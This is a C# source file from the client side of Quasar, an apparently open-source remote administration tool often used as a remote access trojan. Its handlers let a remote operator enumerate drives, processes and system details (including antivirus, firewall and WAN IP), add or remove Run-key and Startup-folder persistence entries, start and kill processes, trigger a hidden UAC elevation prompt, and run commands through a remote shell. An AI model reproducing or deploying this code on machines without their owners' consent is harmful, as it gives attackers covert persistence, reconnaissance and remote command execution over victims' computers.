using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using Microsoft.Win32;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Extensions;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using File = System.IO.File;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
    public static partial class CommandHandler
    {
        public static void HandleGetDrives(GetDrives command, Client client)
        {
            DriveInfo[] driveInfos;
            try
            {
                driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException)
            {
                client.Send(new SetStatusFileManager {Message = "GetDrives I/O error", SetLastDirectorySeen = false});
                return;
            }
            catch (UnauthorizedAccessException)
            {
                client.Send(new SetStatusFileManager {Message = "GetDrives No permission", SetLastDirectorySeen = false});
                return;
            }

            if (driveInfos.Length == 0)
            {
                client.Send(new SetStatusFileManager {Message = "GetDrives No drives", SetLastDirectorySeen = false});
                return;
            }

            Drive[] drives = new Drive[driveInfos.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                try
                {
                    var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
                        ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].VolumeLabel,
                            FormatHelper.DriveTypeName(driveInfos[i].DriveType), driveInfos[i].DriveFormat)
                        : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
                            FormatHelper.DriveTypeName(driveInfos[i].DriveType), driveInfos[i].DriveFormat);

                    drives[i] = new Drive
                        { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
                }
                catch (Exception)
                {
                    
                }
            }

            client.Send(new GetDrivesResponse {Drives = drives});
        }

        public static void HandleDoShutdownAction(DoShutdownAction command, Client client)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (command.Action)
                {
                    case ShutdownAction.Shutdown:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Restart:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Standby:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Action failed: {ex.Message}"});
            }
        }

        public static void HandleGetStartupItems(GetStartupItems command, Client client)
        {
            try
            {
                List<string> startupItems = new List<string>();

                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "0" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "1" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "2" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
                    }
                }
                if (PlatformHelper.Is64Bit)
                {
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "4" + formattedKeyValue));
                        }
                    }
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "5" + formattedKeyValue));
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                    startupItems.AddRange(from file in files where file.Name != "desktop.ini"
                                          select string.Format("{0}||{1}", file.Name, file.FullName) into formattedKeyValue
                                          select "6" + formattedKeyValue);
                }

                client.Send(new GetStartupItemsResponse {StartupItems = startupItems});
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Getting Autostart Items failed: {ex.Message}"});
            }
        }

        public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Client client)
        {
            try
            {
                switch (command.StartupItem.Type)
                {
                    case 0:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 1:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 2:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 3:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 4:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 5:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 6:
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            command.StartupItem.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.StartupItem.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.StartupItem.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Adding Autostart Item failed: {ex.Message}"});
            }
        }

        public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 1:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 2:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 3:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 4:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 5:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 6:
                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("File does not exist");

                        File.Delete(startupItemPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Removing Autostart Item failed: {ex.Message}"});
            }
        }

        public static void HandleGetSystemInfo(GetSystemInfo command, Client client)
        {
            try
            {
                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";


                string[] infoCollection = new string[]
                {
                    "Processor (CPU)",
                    DevicesHelper.GetCpuName(),
                    "Memory (RAM)",
                    string.Format("{0} MB", DevicesHelper.GetTotalRamAmount()),
                    "Video Card (GPU)",
                    DevicesHelper.GetGpuName(),
                    "Username",
                    WindowsAccountHelper.GetName(),
                    "PC Name",
                    SystemHelper.GetPcName(),
                    "Domain Name",
                    domainName,
                    "Host Name",
                    hostName,
                    "System Drive",
                    Path.GetPathRoot(Environment.SystemDirectory),
                    "System Directory",
                    Environment.SystemDirectory,
                    "Uptime",
                    SystemHelper.GetUptime(),
                    "MAC Address",
                    DevicesHelper.GetMacAddress(),
                    "LAN IP Address",
                    DevicesHelper.GetLanIp(),
                    "WAN IP Address",
                    GeoLocationHelper.GeoInfo.Ip,
                    "Antivirus",
                    SystemHelper.GetAntivirus(),
                    "Firewall",
                    SystemHelper.GetFirewall(),
                    "Time Zone",
                    GeoLocationHelper.GeoInfo.Timezone,
                    "Country",
                    GeoLocationHelper.GeoInfo.Country,
                    "ISP",
                    GeoLocationHelper.GeoInfo.Isp
                };

                client.Send(new GetSystemInfoResponse {SystemInfos = infoCollection});
            }
            catch
            {
            }
        }

        public static void HandleGetProcesses(GetProcesses command, Client client)
        {
            Process[] pList = Process.GetProcesses();
            string[] processes = new string[pList.Length];
            int[] ids = new int[pList.Length];
            string[] titles = new string[pList.Length];

            int i = 0;
            foreach (Process p in pList)
            {
                processes[i] = p.ProcessName + ".exe";
                ids[i] = p.Id;
                titles[i] = p.MainWindowTitle;
                i++;
            }

            client.Send(new GetProcessesResponse {Processes = processes, Ids = ids, Titles = titles});
        }

        public static void HandleDoProcessStart(DoProcessStart command, Client client)
        {
            if (string.IsNullOrEmpty(command.ApplicationName))
            {
                client.Send(new SetStatus {Message = "Process could not be started!"});
                return;
            }

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    FileName = command.ApplicationName
                };
                Process.Start(startInfo);
            }
            catch
            {
                client.Send(new SetStatus {Message = "Process could not be started!"});
            }
            finally
            {
                HandleGetProcesses(new GetProcesses(), client);
            }
        }

        public static void HandleDoProcessKill(DoProcessKill command, Client client)
        {
            try
            {
                Process.GetProcessById(command.Pid).Kill();
            }
            catch
            {
            }
            finally
            {
                HandleGetProcesses(new GetProcesses(), client);
            }
        }

        public static void HandleDoAskElevate(DoAskElevate command, Client client)
        {
            if (WindowsAccountHelper.GetAccountType() != "Admin")
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                MutexHelper.CloseMutex();  // close the mutex so our new process will run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
                Program.ConnectClient.Exit();
            }
            else
            {
                client.Send(new SetStatus {Message = "Process already elevated."});
            }
        }
        
        public static void HandleDoShellExecute(DoShellExecute command, Client client)
        {
            string input = command.Command;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new Shell();

            if (input == "exit")
                CloseShell();
            else
                _shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (_shell != null)
                _shell.Dispose();
        }
    }
}
